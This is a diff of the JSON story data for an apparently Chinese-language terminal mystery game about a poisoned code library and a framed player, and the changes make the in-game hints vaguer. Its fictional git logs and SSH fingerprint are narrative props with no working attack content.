-            "密钥": "[green]$ grep '密钥' *[/green]\n\n[dim]在当前目录未找到「密钥」相关内容。[/dim]\n[dim]试试 [bold]grep key[/bold] 或查看陈默的审计笔记。[/dim]",
+            "密钥": "[green]$ grep '密钥' *[/green]\n\n[dim]在当前目录未找到「密钥」相关内容。[/dim]\n[dim]也许换个关键词试试。[/dim]",
             "key": "[green]$ grep -ri 'key' *[/green]\n\nchenmo-audit.md: 解密密钥提示：第一个发现异常的服务名\n\n[bold yellow]解密密钥是「第一个发现异常的服务名」。\n是 user-sync 把数据库打满的……密钥是 user-sync？\n不对，是那个被投毒的核心库：geo-core[/bold yellow]",
-            "decrypt": "[green]$ grep -ri 'decrypt\\|加密\\|encrypted' *[/green]\n\nchenmo-audit.md: 完整的取证笔记被加密保存了\nchenmo-encrypted.gpg: [ENCRYPTED FILE]\n\n[dim]需要 [bold]decrypt chenmo-encrypted.gpg geo-core[/bold] 来解密。[/dim]"
+            "decrypt": "[green]$ grep -ri 'decrypt\\|加密\\|encrypted' *[/green]\n\nchenmo-audit.md: 完整的取证笔记被加密保存了\nchenmo-encrypted.gpg: [ENCRYPTED FILE]\n\n[dim]加密文件需要正确的密钥才能打开。[/dim]"
           },
           "add_flag": "used_grep_code"
         },
@@ -192,13 +192,13 @@
       "transitions": {
         "decrypt_chenmo-encrypted.gpg": {
           "trigger": "decrypt_chenmo-encrypted.gpg",
-          "message": "[green]请输入解密密钥: [/green]\n\n[dim]陈默在审计笔记里留了线索：密钥是「第一个发现异常的服务名」。\n也就是那个被投毒的核心库。试试 [bold]decrypt chenmo-encrypted.gpg geo-core[/bold][/dim]",
+          "message": "[green]请输入解密密钥: [/green]\n\n[dim]陈默在审计笔记里留了线索：密钥是「第一个发现异常的服务名」。\n也就是那个被投毒的核心库……[/dim]",
           "requires_flags": [],
           "requires_items": []
         },
         "decrypt_chenmo-encrypted.gpg_geo-core": {
           "trigger": "decrypt_chenmo-encrypted.gpg_geo-core",
-          "message": "[green]解密密钥: geo-core\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]陈默的取证笔记（解密后）：[/bold]\n\n[italic]\"我追踪到了投毒者的身份。\n\ncommit b8e224f 的 Author 字段被清除了，但 SSH 签名还在。\n签名用的 SSH key fingerprint：\n[bold cyan]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold cyan]\n\n我查了公司的 SSH key 注册系统。这个 fingerprint 属于——\n\n不，我不敢写在这里。你自己去查。\n\n连接 vault-internal，运行 git blame。\n密钥和之前一样。\n\n他们发现我在查了。我必须把线索藏在代码里。\n那些变量名不是我的求救信号——是我在标记他。\n\n如果你读到这些，请小心。投毒者可能就在你身边。\n可能比你想象的更近。\"[/italic]\n\n[bold red]陈默知道投毒者是谁。但他不敢直说。\n他让你自己去查 SSH key fingerprint。[/bold red]\n\n[dim]连接取证服务器。试试 [bold]ssh vault-internal[/bold][/dim]",
+          "message": "[green]解密密钥: geo-core\n验证中......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]陈默的取证笔记（解密后）：[/bold]\n\n[italic]\"我追踪到了投毒者的身份。\n\ncommit b8e224f 的 Author 字段被清除了，但 SSH 签名还在。\n签名用的 SSH key fingerprint：\n[bold cyan]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold cyan]\n\n我查了公司的 SSH key 注册系统。这个 fingerprint 属于——\n\n不，我不敢写在这里。你自己去查。\n\n连接 vault-internal，运行 git blame。\n密钥和之前一样。\n\n他们发现我在查了。我必须把线索藏在代码里。\n那些变量名不是我的求救信号——是我在标记他。\n\n如果你读到这些，请小心。投毒者可能就在你身边。\n可能比你想象的更近。\"[/italic]\n\n[bold red]陈默知道投毒者是谁。但他不敢直说。\n他让你自己去查 SSH key fingerprint。[/bold red]\n\n[dim]取证服务器上有完整的 SSH 签名验证数据。真相就在那里。[/dim]",
           "requires_flags": [],
           "requires_items": [],
           "add_flag": "decrypted_chenmo_notes"
@@ -223,12 +223,12 @@
       "name": "取证终端",
       "ascii_art": "encrypted_terminal.txt",
       "description": "[green]{player_name}@vault-internal:~$[/green]\n\n取证服务器。这里有完整的 Git 签名数据库、SSH key 注册表和服务器访问日志。\n陈默让你在这里运行 git blame 来揭露投毒者的身份。\n\n[red]倒计时：距离后门触发还有不到 5 小时。[/red]",
-      "on_enter": "[bold]你进入了取证服务器。[/bold]\n\n服务器很安静。风扇低沉地嗡嗡作响。\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：03:42 AM\n  ⏰ 后门触发：08:00 AM\n  ⏰ 剩余时间：4 小时 18 分钟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n[dim]用 [bold]ls[/bold] 查看可用数据，然后用 [bold]cat[/bold] 查看详情。\n你需要找到那个 SSH fingerprint 的主人。[/dim]",
+      "on_enter": "[bold]你进入了取证服务器。[/bold]\n\n服务器很安静。风扇低沉地嗡嗡作响。\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：03:42 AM\n  ⏰ 后门触发：08:00 AM\n  ⏰ 剩余时间：4 小时 18 分钟\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n[dim]那个 SSH fingerprint 的主人就是投毒者。答案一定在这些数据里。[/dim]",
       "items": [
         {
           "name": "git-blame.txt",
           "description": "commit b8e224f 的 git blame 结果",
-          "content": "[green]$ cat git-blame.txt[/green]\n\n[bold]git blame output for commit b8e224f:[/bold]\n\n[cyan]b8e224f[/cyan] ([dim]<author wiped>[/dim] 2025-12-18 03:47:22 +0800)\n\n[bold]Git SSH Signature:[/bold]\n  Status: [green]VERIFIED[/green]\n  Key Type: ssh-rsa 4096\n  Fingerprint: [bold cyan]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold cyan]\n  Signed at: 2025-12-18 03:47:22 +0800\n\n[bold yellow]签名是验证通过的。这个 SSH key 的主人就是投毒者。\n现在需要查 SSH key 注册表，看这个 fingerprint 属于谁。[/bold yellow]\n\n[dim]试试 [bold]cat ssh-registry.txt[/bold] 查看公司的 SSH key 注册表。[/dim]",
+          "content": "[green]$ cat git-blame.txt[/green]\n\n[bold]git blame output for commit b8e224f:[/bold]\n\n[cyan]b8e224f[/cyan] ([dim]<author wiped>[/dim] 2025-12-18 03:47:22 +0800)\n\n[bold]Git SSH Signature:[/bold]\n  Status: [green]VERIFIED[/green]\n  Key Type: ssh-rsa 4096\n  Fingerprint: [bold cyan]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold cyan]\n  Signed at: 2025-12-18 03:47:22 +0800\n\n[bold yellow]签名是验证通过的。这个 SSH key 的主人就是投毒者。\n现在需要查 SSH key 注册表，看这个 fingerprint 属于谁。[/bold yellow]\n\n[dim]公司的 SSH key 注册表里能查到每个 fingerprint 的归属。[/dim]",
           "takeable": false
         },
         {
@@ -240,7 +240,7 @@
         {
           "name": "access-log.txt",
           "description": "服务器访问日志",
-          "content": "[green]$ cat access-log.txt[/green]\n\n[bold]Server Access Log - 2025-12-18[/bold]\n\n[dim]TIME        USER              SOURCE IP        ACTION[/dim]\n[dim]03:42:15    {player_name}          10.20.1.88       SSH login[/dim]\n[dim]03:43:01    {player_name}          10.20.1.88       cd /repos/nova-geo-core[/dim]\n[dim]03:44:30    {player_name}          10.20.1.88       git checkout -b security-patch[/dim]\n[dim]03:45:12    {player_name}          10.20.1.88       vim src/core/validator.ts[/dim]\n[dim]03:47:22    {player_name}          10.20.1.88       git commit -S -m \"security: patch CVE-2025-41205\"[/dim]\n[dim]03:47:45    {player_name}          10.20.1.88       git push origin security-patch[/dim]\n[dim]03:48:01    {player_name}          10.20.1.88       git merge security-patch --no-ff[/dim]\n[dim]03:48:30    {player_name}          10.20.1.88       git log --format=\"%H %an\" | sed 's/{player_name}/<wiped>/'[/dim]\n[dim]03:49:02    {player_name}          10.20.1.88       logout[/dim]\n\n[bold red]每一行都是你的用户名。你的 IP。你的主机。[/bold red]\n\n[bold red]2025 年 12 月 18 日，凌晨 3:42。\n你登录了代码服务器，写入了后门代码，用你的 SSH key 签名提交，\n然后试图用 sed 清除提交者信息。[/bold red]\n\n[bold yellow]但你清除了 Author 字段，却忘了 SSH 签名是独立验证的。[/bold yellow]\n\n[dim]查看 [bold]cat hostname-log.txt[/bold] 确认来源主机。[/dim]",
+          "content": "[green]$ cat access-log.txt[/green]\n\n[bold]Server Access Log - 2025-12-18[/bold]\n\n[dim]TIME        USER              SOURCE IP        ACTION[/dim]\n[dim]03:42:15    {player_name}          10.20.1.88       SSH login[/dim]\n[dim]03:43:01    {player_name}          10.20.1.88       cd /repos/nova-geo-core[/dim]\n[dim]03:44:30    {player_name}          10.20.1.88       git checkout -b security-patch[/dim]\n[dim]03:45:12    {player_name}          10.20.1.88       vim src/core/validator.ts[/dim]\n[dim]03:47:22    {player_name}          10.20.1.88       git commit -S -m \"security: patch CVE-2025-41205\"[/dim]\n[dim]03:47:45    {player_name}          10.20.1.88       git push origin security-patch[/dim]\n[dim]03:48:01    {player_name}          10.20.1.88       git merge security-patch --no-ff[/dim]\n[dim]03:48:30    {player_name}          10.20.1.88       git log --format=\"%H %an\" | sed 's/{player_name}/<wiped>/'[/dim]\n[dim]03:49:02    {player_name}          10.20.1.88       logout[/dim]\n\n[bold red]每一行都是你的用户名。你的 IP。你的主机。[/bold red]\n\n[bold red]2025 年 12 月 18 日，凌晨 3:42。\n你登录了代码服务器，写入了后门代码，用你的 SSH key 签名提交，\n然后试图用 sed 清除提交者信息。[/bold red]\n\n[bold yellow]但你清除了 Author 字段，却忘了 SSH 签名是独立验证的。[/bold yellow]\n\n[dim]来源主机名会确认一切。[/dim]",
           "takeable": false
         },
         {
@@ -291,7 +291,7 @@
         },
         "decrypt_access-log.txt": {
           "trigger": "decrypt_access-log.txt",
-          "message": "[dim]这个文件不需要解密，直接 [bold]cat access-log.txt[/bold] 就能查看。[/dim]",
+          "message": "[dim]这个文件没有加密，可以直接读取。[/dim]",
           "requires_flags": [],
           "requires_items": []
         }
@@ -302,12 +302,12 @@
       "name": "镜像",
       "ascii_art": "final_message.txt",
       "description": "你的终端。你的命令历史。你的 SSH key。你的 IP 地址。你的主机名。\n\n所有证据都指向同一个人。",
-      "on_enter": "[bold red]你坐在黑暗中，盯着屏幕。[/bold red]\n\n所有的线索在你脑中重新排列——\n\n投毒提交 b8e224f，凌晨 3:47。\nSSH 签名：你的 key。\n服务器日志：你的用户名，你的 IP，你的主机名。\n\n你没有那天晚上的记忆。\n\n[bold yellow]然后你重新理解了陈默代码里的那些变量名。[/bold yellow]\n\n[dim]用 [bold]cat reinterpretation.txt[/bold] 重新审视那些线索。\n用 [bold]history[/bold] 查看你自己的命令历史。[/dim]",
+      "on_enter": "[bold red]你坐在黑暗中，盯着屏幕。[/bold red]\n\n所有的线索在你脑中重新排列——\n\n投毒提交 b8e224f，凌晨 3:47。\nSSH 签名：你的 key。\n服务器日志：你的用户名，你的 IP，你的主机名。\n\n你没有那天晚上的记忆。\n\n[bold yellow]然后你重新理解了陈默代码里的那些变量名。[/bold yellow]\n\n[dim]陈默代码里的那些变量名……现在看来意味着完全不同的东西。\n而你自己的命令历史……你敢看吗？[/dim]",
       "items": [
         {
           "name": "reinterpretation.txt",
           "description": "重新解读陈默的代码信号",
-          "content": "[green]$ cat reinterpretation.txt[/green]\n\n[bold]重新解读陈默的代码信号：[/bold]\n\n你之前以为那些变量名是陈默在求救。\n但陈默已经知道投毒者是你。\n\n他不是在求救。他是在[bold red]标记你[/bold red]。\n\n[yellow]原来的理解：[/yellow]\n  helpMe → 陈默在呼救\n  trapped → 陈默被困住了\n  floor12 → 陈默被关的楼层\n  needsRescue → 陈默需要救援\n  河东区洛青路88号 → 陈默被关押的地点\n\n[red]真正的含义：[/red]\n  helpMe → [bold red]帮帮我，我发现了 {player_name} 的后门[/bold red]\n  trapped → [bold red]我被 {player_name} 盯上了，走不了了[/bold red]\n  floor12 → [bold red]{player_name} 在12楼的服务器间植入了代码[/bold red]\n  needsRescue → [bold red]有人来救我，{player_name} 要对我下手了[/bold red]\n  河东区洛青路88号 → [bold red]证据备份的物理位置，防止 {player_name} 远程删除[/bold red]\n\n[bold red]陈默不是被不明势力绑架的。\n陈默是被你逼走的。或者更糟。[/bold red]\n\n[dim]试试 [bold]history[/bold] 看看你本地的命令历史。[/dim]",
+          "content": "[green]$ cat reinterpretation.txt[/green]\n\n[bold]重新解读陈默的代码信号：[/bold]\n\n你之前以为那些变量名是陈默在求救。\n但陈默已经知道投毒者是你。\n\n他不是在求救。他是在[bold red]标记你[/bold red]。\n\n[yellow]原来的理解：[/yellow]\n  helpMe → 陈默在呼救\n  trapped → 陈默被困住了\n  floor12 → 陈默被关的楼层\n  needsRescue → 陈默需要救援\n  河东区洛青路88号 → 陈默被关押的地点\n\n[red]真正的含义：[/red]\n  helpMe → [bold red]帮帮我，我发现了 {player_name} 的后门[/bold red]\n  trapped → [bold red]我被 {player_name} 盯上了，走不了了[/bold red]\n  floor12 → [bold red]{player_name} 在12楼的服务器间植入了代码[/bold red]\n  needsRescue → [bold red]有人来救我，{player_name} 要对我下手了[/bold red]\n  河东区洛青路88号 → [bold red]证据备份的物理位置，防止 {player_name} 远程删除[/bold red]\n\n[bold red]陈默不是被不明势力绑架的。\n陈默是被你逼走的。或者更糟。[/bold red]\n\n[dim]你的命令历史里还藏着什么？[/dim]",
           "takeable": false
         },
         {
@@ -319,7 +319,7 @@
         {
           "name": "timeline.txt",
           "description": "事件时间线",
-          "content": "[green]$ cat timeline.txt[/green]\n\n[bold]事件时间线：[/bold]\n\n[dim]2025-12-18 03:35[/dim]  你（{player_name}）登录代码服务器\n[dim]2025-12-18 03:47[/dim]  你提交后门代码（commit b8e224f）\n[dim]2025-12-18 03:49[/dim]  你清除 Author 字段并强推\n[dim]......[/dim]\n[dim]2026-03-02 11:30[/dim]  你更新 geo-core 依赖到包含后门的 v2.8.4\n[dim]2026-03-14 ??:??[/dim]  陈默完成审计，发现后门，追踪到你\n[dim]2026-03-15 02:10[/dim]  你登录取证服务器删除陈默的笔记\n[dim]2026-03-15 ??:??[/dim]  陈默失联\n[dim]2026-03-15 14:22[/dim]  陈默最后的 PR（隐藏信号）被合并\n[dim]2026-03-18 02:58[/dim]  后门提前触发（你设的 failsafe？）\n[dim]2026-03-18 03:00[/dim]  PagerDuty 告警。你被叫醒。\n\n[bold red]凌晨3点的 PagerDuty 告警不是叫你来修 bug 的。\n\n是叫你来善后的。[/bold red]\n\n[dim]试试 [bold]cat final_message.txt[/bold][/dim]",
+          "content": "[green]$ cat timeline.txt[/green]\n\n[bold]事件时间线：[/bold]\n\n[dim]2025-12-18 03:35[/dim]  你（{player_name}）登录代码服务器\n[dim]2025-12-18 03:47[/dim]  你提交后门代码（commit b8e224f）\n[dim]2025-12-18 03:49[/dim]  你清除 Author 字段并强推\n[dim]......[/dim]\n[dim]2026-03-02 11:30[/dim]  你更新 geo-core 依赖到包含后门的 v2.8.4\n[dim]2026-03-14 ??:??[/dim]  陈默完成审计，发现后门，追踪到你\n[dim]2026-03-15 02:10[/dim]  你登录取证服务器删除陈默的笔记\n[dim]2026-03-15 ??:??[/dim]  陈默失联\n[dim]2026-03-15 14:22[/dim]  陈默最后的 PR（隐藏信号）被合并\n[dim]2026-03-18 02:58[/dim]  后门提前触发（你设的 failsafe？）\n[dim]2026-03-18 03:00[/dim]  PagerDuty 告警。你被叫醒。\n\n[bold red]凌晨3点的 PagerDuty 告警不是叫你来修 bug 的。\n\n是叫你来善后的。[/bold red]\n\n[dim]还有一条消息，在等着你。[/dim]",
           "takeable": false
         },
         {
